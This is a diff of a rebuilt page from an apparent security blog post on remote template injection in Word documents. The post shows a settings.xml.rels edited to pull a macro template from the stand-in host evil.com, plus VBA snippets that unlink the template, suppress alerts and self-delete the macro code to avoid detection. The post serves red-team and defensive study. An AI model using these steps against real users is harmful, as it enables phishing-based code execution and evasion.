@@ -11,7 +11,7 @@
   <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
   <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.6.1 -->
 <title>VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion | John Woodman’s Security Blog</title>
-<meta name="generator" content="Jekyll v3.8.6" />
+<meta name="generator" content="Jekyll v4.1.1" />
 <meta property="og:title" content="VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion" />
 <meta name="author" content="John Woodman" />
 <meta property="og:locale" content="en_US" />
@@ -21,7 +21,7 @@
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-11-28T00:00:00+00:00" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion","dateModified":"2019-11-28T00:00:00+00:00","datePublished":"2019-11-28T00:00:00+00:00","url":"/posts/VBA-Macro-Remote-Template-Injection/","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/VBA-Macro-Remote-Template-Injection/"},"author":{"@type":"Person","name":"John Woodman"},"description":"One of the most common methods leveraged by attackers is the use of Malicious Word/Excel Documents sent over email. These malicious docs are embedded with macro VBA code that, when run, execute various tasks on the victim’s computer, usually resulting in RCE (Remote Code Execution) and/or data exfiltration.","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion","dateModified":"2019-11-28T00:00:00+00:00","datePublished":"2019-11-28T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/VBA-Macro-Remote-Template-Injection/"},"author":{"@type":"Person","name":"John Woodman"},"url":"/posts/VBA-Macro-Remote-Template-Injection/","description":"One of the most common methods leveraged by attackers is the use of Malicious Word/Excel Documents sent over email. These malicious docs are embedded with macro VBA code that, when run, execute various tasks on the victim’s computer, usually resulting in RCE (Remote Code Execution) and/or data exfiltration.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 </head>
@@ -40,9 +40,11 @@
 <a href="/about"><h2 class="header-link">About</h2></a>
 <a href="/hackthebox"><h2 class="header-link">HackTheBox</h2></a>
 <a href="/ctf"><h2 class="header-link">CTF</h2></a>
+<a href="https://twitter.john-woodman.com" target="_blank"><h2 class="header-link">HackerTwitter</h2></a>
+<a href="/gardening"><h2 class="header-link">Gardening</h2></a>
 <a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
-<a href="https://twitter.com/JohnWoodman15"><h2 class="header-link"><img src="/assets/twitter.png" style="vertical-align:middle" width="45"/></h2></a>
-<a href="https://github.com/JohnWoodman"><h2 class="header-link"><img src="/assets/github.png" style="vertical-align:middle; margin-left:-7px" width="45"/></h2></a>
+<a href="https://twitter.com/JohnWoodman15" target="_blank"><h2 class="header-link"><img src="/assets/twitter.png" style="vertical-align:middle" width="45"/></h2></a>
+<a href="https://github.com/JohnWoodman" target="_blank"><h2 class="header-link"><img src="/assets/github.png" style="vertical-align:middle; margin-left:-7px" width="45"/></h2></a>
 
     </div>
   </div>
@@ -65,16 +67,16 @@
 
 <p>Below shows the contents of settings.xml.rels that you would typically find with most documents:</p>
 <blockquote>
-  <?xml version=”1.0" encoding=”UTF-8" standalone=”yes”?>
-  <p>&lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&gt;&lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”file:////Users/johnwoodman/Library/Containers/com.microsoft.Word/Data/Library/Application%20Support/Microsoft/Office/16.0/DTS/en-US%7b95D41D06–9CC6-D74F-A607–2B7C0EB22DFC%7d/%7b33B4F4BC-0742–3849-AA14-CD5092D5B844%7dtf10002086.dotx” TargetMode=”External”/&gt;&lt;/Relationships&gt;</p>
+  <p>&lt;?xml version=”1.0” encoding=”UTF-8” standalone=”yes”?&gt;
+&lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&gt;&lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”file:////Users/johnwoodman/Library/Containers/com.microsoft.Word/Data/Library/Application%20Support/Microsoft/Office/16.0/DTS/en-US%7b95D41D06–9CC6-D74F-A607–2B7C0EB22DFC%7d/%7b33B4F4BC-0742–3849-AA14-CD5092D5B844%7dtf10002086.dotx” TargetMode=”External”/&gt;&lt;/Relationships&gt;</p>
 </blockquote>
 
 <p>The part to pay attention to is the “Target” attribute. At the moment, this attribute is pointing to a file on the local machine. What we are able to do is change the value so it points to a remote file, which will then be used as the template for that document. This template would contain the macros you want to be executed. You can specify either an HTTP(S) URL or a SMB address pointing to your template.</p>
 
 <p>Below shows the contents of settings.xml.rels after it has been altered to point to a malicious web server containing a malicious word template:</p>
 <blockquote>
-  <?xml version=”1.0" encoding=”UTF-8" standalone=”yes”?>
-  <p>&lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&gt;&lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”https://evil.com/malicious.dotm” TargetMode=”External”/&gt;&lt;/Relationships&gt;</p>
+  <p>&lt;?xml version=”1.0” encoding=”UTF-8” standalone=”yes”?&gt;
+&lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&gt;&lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”https://evil.com/malicious.dotm” TargetMode=”External”/&gt;&lt;/Relationships&gt;</p>
 </blockquote>
 
 <p>Once edited, all you have to do is re-zip the XML files and rename the extension to .docx. All that is left to do is send malicious doc to your “target” and once opened (and content is enabled) the template is pulled from the malicious web server and the macro code inside it is executed.</p>
@@ -87,7 +89,7 @@
 
 <p>The technique I found to get around this is by unlinking the template using VBA. The below snippet of VBA code shows how the unlinking is done, as well as how to prevent dialog boxes from popping up to the target user asking them to “Save Changes”.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub unlink()
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub unlink()
     Application.DisplayAlerts = False
     On Error GoTo Destroy
     ThisDocument.AttachedTemplate.Saved = True
@@ -112,7 +114,7 @@ End Sub
 
 <p>The code in the “Destroy” section of the code is the self-deletion, essentially a fail-safe. If an error occurs in the unlinking process (either through Normal.dotm not existing, or another error that I will discuss below), then the function “DeleteVBAPROJECT” is called. This function deletes all the code in the template. Below is a snippet of that function’s code:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub DeleteVBAPROJECT()
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub DeleteVBAPROJECT()
     Application.DisplayAlerts = False
     Dim i As Long
     On Error Resume Next
